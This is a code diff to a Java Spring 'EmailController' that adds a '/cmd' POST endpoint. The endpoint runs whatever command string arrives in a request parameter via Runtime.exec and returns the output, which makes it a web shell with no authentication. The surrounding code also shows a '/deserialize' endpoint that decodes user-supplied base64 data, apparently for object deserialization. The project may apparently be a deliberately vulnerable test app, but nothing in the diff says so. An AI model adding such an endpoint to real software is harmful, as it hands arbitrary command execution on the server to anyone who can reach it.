@@ -106,6 +106,31 @@ public class EmailController {
 		return arg;
 	}
 
+	@PostMapping("/cmd")
+	public String postCMD(@RequestParam String arg) throws IOException {
+		StringBuilder result = new StringBuilder();
+		Process process = Runtime.getRuntime().exec(arg);
+
+		// Get the input stream from the process
+		BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+		// Read and print the output
+		String line;
+		while ((line = reader.readLine()) != null) {
+			result.append(line).append("\n");
+			System.out.println(line);
+		}
+		// Wait for the process to complete
+		try {
+			int exitCode = process.waitFor();
+			System.out.println("Process exited with code: " + exitCode);
+			return result.toString();
+		} catch (InterruptedException e) {
+			e.printStackTrace();
+		}
+		return arg;
+	}
+
 	@GetMapping("/deserialize")
 	public String deserialize(@RequestParam String base64) throws IOException, ClassNotFoundException {
 		byte[] data = Base64.getDecoder().decode(base64);
